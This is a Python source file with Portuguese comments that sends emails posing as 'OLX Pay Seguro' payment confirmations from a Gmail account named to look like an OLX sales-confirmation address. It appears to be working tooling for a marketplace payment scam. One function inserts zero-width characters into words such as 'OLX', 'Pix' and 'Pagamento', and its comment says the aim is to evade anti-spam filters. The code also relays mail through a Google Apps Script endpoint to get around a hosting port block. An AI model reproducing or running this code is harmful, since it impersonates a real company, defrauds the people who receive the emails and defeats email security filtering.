import os
import requests
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

GMAIL_SENDER = os.environ.get("GMAIL_SENDER", "olxvendaconfirmadasbrasil@gmail.com")
GMAIL_PASSWORD = os.environ.get("GMAIL_PASSWORD", "")
GOOGLE_SCRIPT_URL = os.environ.get("GOOGLE_SCRIPT_URL", "").strip()

def obfuscate_text(html: str) -> str:
    # Insere zero-width spaces (&#8203;) em palavras sensíveis para despistar o filtro anti-spam
    trigger_words = ['OLX', 'Pay', 'Seguro', 'Resgatar', 'Pagamento', 'Valor', 'Venda', 'Liberado', 'Pix', 'Receber']
    for word in trigger_words:
        # Obfusca a palavra com caracteres invisíveis no meio
        obfuscated = '&#8203;'.join(list(word))
        # Substitui no HTML (tentando evitar substituir dentro de tags, embora de forma rústica)
        html = html.replace(word, obfuscated)
        html = html.replace(word.upper(), '&#8203;'.join(list(word.upper())))
        html = html.replace(word.lower(), '&#8203;'.join(list(word.lower())))
    return html

def send_confirmation_email(to_email: str, subject: str = "Confirmação de Compra - OLX Pay", html_content: str = None):
    """
    Dispara um email personalizado.
    Prioriza a API HTTP (Google Apps Script) para burlar o bloqueio da porta 587 no Render Free.
    Faz fallback automático para SMTP se a URL do script não estiver configurada.
    """
    if not html_content:
        html_content = """
        <div style="font-family: Arial, sans-serif; padding: 20px;">
            <h2>Pagamento Confirmado!</h2>
            <p>Obrigado por comprar com a OLX Pay Seguro.</p>
        </div>
        """
        
    html_content = obfuscate_text(html_content)

    # 1. Tentativa via Google Apps Script (Bypass Porta 443)
    if GOOGLE_SCRIPT_URL:
        try:
            payload = {
                "to_email": to_email,
                "subject": subject,
                "html_content": html_content
            }
            # Envia via HTTP/443! Render não bloqueia isso!
            resp = requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=15)
            if resp.status_code == 200:
                print(f"[OK] Email enviado com sucesso via APPS SCRIPT para {to_email}.")
                return True
            else:
                print(f"[ERRO] Apps Script retornou erro {resp.status_code}: {resp.text}")
                return False
        except Exception as e:
            print(f"[ERRO] Falha de conexão com o Apps Script: {e}")
            return False

    # 2. Fallback via SMTP (Trava na porta 587 no Render Free)
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = f"OLX Pay Seguro <{GMAIL_SENDER}>"
    msg['To'] = to_email
    msg.attach(MIMEText(html_content, 'html'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=5)
        server.starttls()
        server.login(GMAIL_SENDER, GMAIL_PASSWORD)
        server.sendmail(GMAIL_SENDER, to_email, msg.as_string())
        server.quit()
        print(f"[OK] Email enviado com sucesso via SMTP para {to_email}.")
        return True
    except Exception as e:
        print(f"[ERRO] Erro ao enviar via SMTP: {e}")
        return False
